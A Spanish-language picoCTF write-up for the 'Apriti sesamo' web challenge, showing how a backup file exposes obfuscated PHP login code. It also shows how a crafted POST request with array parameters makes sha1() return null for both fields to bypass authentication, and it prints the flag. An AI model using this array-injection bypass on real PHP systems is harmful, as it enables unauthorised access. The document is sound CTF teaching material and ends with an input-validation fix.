---
title: Apriti sesamo
date: 2025-07-24 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, explotación web, php array injection]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>Apriti sesamo
Author: Junias Bonou
Description
I found a web app that claims to be impossible to hack! Try it here!
{: .prompt-tip }

Entras al sitio web indicado y te encuentras un formulario 

``` html
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               

Username:

Password:

```

Después de un buen rato testeando si podía haber algún tipo de sqli, comencé a pensar en otro tipo de inyección. En las pistas hablan de un backup, y de que el autor le gusta emacs...
Tarde un rato en caer en lo que querían estas pistas, los archivos de backup de muchos editores en GNU/Linux se llaman igual que el original seguido del símbolo **~**

Así que cambio  http://verbal-sleep.picoctf.net:49414/impossibleLogin.php por
http://verbal-sleep.picoctf.net:49414/impossibleLogin.php~

El archivo parece le mismo pero el pie del documento hay una diferencia a investigar parece PHP codificado.
``` html
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<?php
 if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?>

``` 

Uso una herramienta online para poner más entendible el código PHP, está me sirvió perfectamente
[https://codebeautify.org/php-beautifier#](https://codebeautify.org/php-beautifier#)
``` php
<?php
if (
    isset(
        $_POST[
            base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")
        ]
    ) &&
    isset($_POST[base64_decode("\143\x48\x64\x6b")])
) {
    $yuf85e0677 =
        $_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
    $rs35c246d5 = $_POST[base64_decode("\143\x48\144\153")];
    if ($yuf85e0677 == $rs35c246d5) {
        echo base64_decode(
            "\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d"
        );
    } else {
        if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
            echo file_get_contents(
                base64_decode(
                    "\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"
                )
            );
        } else {
            echo base64_decode(
                "\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75"
            );
        }
    }
} ?>
```
Ahora que puedo leer el código podemos destriparlo por partes y sacar todas las cadenas que contiene
``` php 
<?php
echo base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")."\n";
echo base64_decode("\143\x48\x64\x6b")."\n";
echo base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")."\n";
echo base64_decode("\143\x48\144\153")."\n";
echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d")."\n";
echo base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75")."\n";
echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75")."\n";
?>
```

Pruebo el script que he creado para ver las cadenas descodificadas.

``` shell
pablo☠office Apriti-sesamo$ php test.php
username
pwd
username
pwd
<br/>Failed! No flag for you
../flag.txt
<br/>Failed! No flag for you
```

En algunos casos las cadenas cons las mismas solo varía la codificación y se repiten una vez descodificadas, la información relevante está en el propio código, especialmente esta parte
``` php 
    $yuf85e0677 =
        $_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
    $rs35c246d5 = $_POST[base64_decode("\143\x48\144\153")];
    if ($yuf85e0677 == $rs35c246d5) {
        echo base64_decode(
            "\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d"
        );
    } else {
        if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
            echo file_get_contents(
                base64_decode(
                    "\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"
                )
            );
```
la variable **yuf85e0677** y la variable **rs35c246d5** llegan por POST, si son iguales tendrás el mensaje "<br/>Failed! No flag for you" , sin embargo si el sha1 de ambas palabras son iguales === entonces nos devuelve el contenido de flag.txt. Habíamos visto un reto donde se basaba en parte en los PDFs cuyo SHA1, colisionaba, pero esto son palabras no son archivos, encontrar una colisión de SHA-1 no debe ser posible, tiene que haber otra manera. Busco unas ideas y finalmente encuento algo que parece funcionar **PHP Array Injection**

```
POST http://verbal-sleep.picoctf.net:49414/impossibleLogin.php HTTP/1.1
host: verbal-sleep.picoctf.net:49414
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
content-length: 19
Origin: http://verbal-sleep.picoctf.net:49414
Connection: keep-alive
Referer: http://verbal-sleep.picoctf.net:49414/impossibleLogin.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username[]=&pwd[]=1
```
La idea es truncar la lógica de la función sha1 aprovechando que no hay una sanitización de las variable una vez se lee el post. 

``` html
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
picoCTF{w3Ll_d3sErV3d_Ch4mp_d543c99c}
```
Engañando la lógica de PHP, la función **sha1** de esta versión de PHP se trunca cuando se le envía un objeto Array, de forma que la misma devuelve Null, así que devolvió null para ambos hashes, lo que hizo que la condición null === null fuera verdadera.

flag: **picoCTF{w3Ll_d3sErV3d_Ch4mp_d543c99c}**

Esto se hubiera solucionado, sanitizando las entradas del formulario y solo aceptando strings
``` php
if(
    isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")]) &&
    is_string($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")]) &&

    isset($_POST[base64_decode("\143\x48\x64\x6b")]) &&
    is_string($_POST[base64_decode("\143\x48\x64\x6b")])
){.....
```